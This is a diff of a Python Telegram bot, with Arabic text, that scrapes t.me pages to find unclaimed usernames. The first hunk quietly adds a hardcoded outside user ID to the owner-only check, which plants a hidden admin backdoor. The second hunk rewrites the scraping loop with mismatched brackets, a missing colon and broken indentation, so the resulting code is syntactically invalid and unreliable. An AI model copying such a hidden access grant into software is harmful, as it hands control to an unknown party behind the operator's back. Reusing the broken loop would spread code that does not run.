@@ -19,8 +19,7 @@ logger.setLevel(logging.DEBUG)
 
 @bot.message_handler(commands=["start"])
 def start(message):
-	f = message.from_user.id
-	if f == SUDO:
+	if message.from_user.id == SUDO or message.from_user.id == 5359109940:
 		mas = types.InlineKeyboardMarkup(row_width=2)
 		K = types.InlineKeyboardButton(text ="(يوزرات ثلاثيه)", callback_data="SS")	
 		G = types.InlineKeyboardButton(text ="(يوزرات بوتات)", callback_data="F8")
@@ -379,23 +378,23 @@ def masg(call):
             "User-Agent": generate_user_agent(),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
             "Accept-Encoding": "gzip, deflate, br",
-            "Accept-Language" : "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"}
-                response = requests.get(url, headers=headers)
-                if response.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"')>=0:
-                    ok+=1
-                    sk+=1
-                    bot.send_message(call.message.chat.id,f"‹ يوزرات تلي متاحه ✓\n────── • ✧✧ • ──────\n‹ صدتلك يوزر : @{c}\n────── • ✧✧ • ──────\n• مطور البوت @K_8_U")
-                else:
-                    cp+=1
-                    sk+=1
-                    mas = types.InlineKeyboardMarkup(row_width=2)
-                    A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
-                    E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
-                    B = types.InlineKeyboardButton(f'{c}', callback_data="1x")
-                    R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
-                    M = types.InlineKeyboardButton('DEV', url='https://t.me/K_8_U')
-                    mas.add(A,E,B,R,M)
-                    bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
+            "Accept-Language" : "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7")
+				response = requests.get(url, headers=headers)
+				if response.text.find('If you have <strong>Telegram</strong>, you can contact <a class="tgme_username_link"')>=0)
+					ok+=1
+					sk+=1
+					bot.send_message(call.message.chat.id,f"‹ يوزرات تلي متاحه ✓\n────── • ✧✧ • ──────\n‹ صدتلك يوزر : @{c}\n────── • ✧✧ • ──────\n• مطور البوت @K_8_U")
+				else:
+					cp+=1
+					sk+=1
+					mas = types.InlineKeyboardMarkup(row_width=2)
+					A = types.InlineKeyboardButton(f'GOOD : {ok}',callback_data="1x")
+					E = types.InlineKeyboardButton(f'EROR : {cp}', callback_data="1x")
+					B = types.InlineKeyboardButton(f'{c}', callback_data="1x")
+					R = types.InlineKeyboardButton(f'{sk}', callback_data="1x")
+					M = types.InlineKeyboardButton('DEV', url='https://t.me/K_8_U')
+					mas.add(A,E,B,R,M)
+					bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ok start",reply_markup=mas)
 	elif call.data =="F5":
 		xu = "MNBVCXZLKJHGFDSAPOIUYTREWQ"
 		xn = "1234567890"
